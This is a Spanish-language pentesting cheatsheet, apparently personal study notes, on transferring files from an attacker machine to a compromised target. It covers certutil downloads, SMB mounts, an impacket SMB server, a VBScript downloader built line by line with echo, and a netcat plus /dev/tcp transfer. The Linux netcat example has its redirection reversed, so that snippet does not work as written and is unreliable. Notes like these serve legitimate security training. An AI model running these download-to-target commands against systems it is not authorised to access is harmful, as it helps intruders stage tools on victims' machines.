# Envío de archivos Cheatsheet

## Windows

### Certutil

```
python3 -m http.server 80 #En la máquina atacante
certutil.exe -f -urlcache -split http://10.10.10.10/Archivo.txt Archivo.txt #En la máquina atacada
```

### Montura SMB

```
mount -t cifs //10.10.10.55/CarpetadeSMB -o username=USUARIO,password=CONTRASEÑA,domain=DOMINIO,rw
```

\[\*] Aplicar una búsqueda recursiva o un find en una montura puede ir extremadamente lento \[\*]

Comando interesantes:

```
df -h #Para ver todas las monturas de nuestro equipo
df -k -F cifs #Encontrar la cifs que hemos montado
```

#### Impacket

Por impacket podemos montarnos también un servidor en nuestra máquina atacante.

```
impacket-smbserver <nombrecarpetacompartida> $(pwd) -smb2support

#Accedemos a los recursos desde Windows
powershell -c cp \\<IPatacante>\<nombrecarpetacompartida>\<nombrearchivo> <output>
```

## HTTP y VBScript

La idea es a través de línea de comandos crearnos un script con VBS que nos permitirá luego recuperar información a través de HTTP. Por lo que en la máquina objetivo realizamos los siguientes comandos:

```vba
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Tras haber hecho esto en principio podemos poner un servidor http a la escucha en la máquina atacante:

```
python3 -m http.server 80
```

Y descargar el archivo que queramos desde la máquina objetivo con el siguiente comando:

```
cscript /nologo wget.vbs http://<IPatacante>/<archivo> <nombreoutput>
```

## Linux

### Cat

```
#Máquina atacante
nc -q 5 -nlvp 80 > <archivoaenviar>
#Máquina objetivo
cat < /dev/tcp/<ipatacante>/<puertonc> > <nombrearchivooutput>
```

> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
